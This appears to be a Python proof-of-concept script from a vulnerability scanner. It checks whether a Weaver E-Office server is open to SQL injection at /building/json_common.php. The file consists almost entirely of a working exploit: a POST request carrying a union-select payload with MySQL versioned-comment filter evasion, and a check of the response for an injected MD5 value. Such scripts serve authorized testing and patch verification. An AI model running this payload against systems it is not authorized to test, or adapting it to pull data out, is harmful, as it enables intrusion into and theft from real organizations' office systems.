import requests
import urllib

def verify(url):
    relsult = {
        'name': '泛微E-Office-json_common.phpSQL注入漏洞',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36',
        'Connection': 'close',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept-Encoding': 'gzip'
    }
    data = '''tfs=city` where cityId =-1 /*!50000union*/ /*!50000select*/1,2,md5(102103122) ,4#|2|333'''
    vurl = urllib.parse.urljoin(url, "/building/json_common.php")
    try:
        response = requests.post(vurl, headers=headers, data=data)
        if response.status_code == 200 and '6cfe798ba8' in response.text:
            relsult['vulnerable'] = True
            relsult['verify'] = vurl
        return relsult

    except:
        return relsult